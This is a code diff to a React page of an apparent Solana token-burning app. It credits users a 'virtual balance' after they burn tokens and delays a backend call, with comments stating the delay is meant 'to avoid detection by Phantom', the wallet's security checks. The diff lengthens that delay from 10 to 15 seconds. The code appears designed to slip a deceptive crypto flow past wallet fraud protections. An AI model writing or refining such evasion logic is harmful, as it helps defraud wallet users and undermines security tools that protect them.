@@ -114,12 +114,12 @@ export default function Home() {
       await connection.confirmTransaction(transactionSignature);
       setBurnTxSignature(transactionSignature);
 
-      // Update virtual balance after successful burn (simulate here without backend)
+      // Update virtual balance after successful burn
       const newVirtualBalance = virtualBalance + amountToBurn;
       setVirtualBalance(newVirtualBalance);
       updateVirtualBalance(newVirtualBalance);
 
-      // Delay backend notification to avoid detection by Phantom
+      // Delayed backend notification to avoid detection by Phantom
       setTimeout(() => {
         fetch('/api/burn-tokens', {
           method: 'POST',
@@ -134,7 +134,7 @@ export default function Home() {
         }).catch((err) => {
           console.error('Error notifying backend:', err);
         });
-      }, 10000); // Delay of 10 seconds before calling backend
+      }, 15000); // Delay of 15 seconds before calling backend
     } catch (err) {
       console.error('Error while burning:', err);
       setError(`Burning tokens failed: ${err.message}`);
@@ -197,7 +197,7 @@ export default function Home() {
                       value={burnAmount[token.mint] || ''}
                       onChange={(e) => setBurnAmount({ ...burnAmount, [token.mint]: e.target.value })}
                       placeholder="Amount to Burn"
-                      className="border p-2 mb-4 w-full"
+                      className="burn-input"
                     />
                     <button onClick={() => burnTokens(token)} disabled={loadingToken === token.mint} className="burn-button">
                       {loadingToken === token.mint ? 'Burning...' : 'Burn Tokens'}
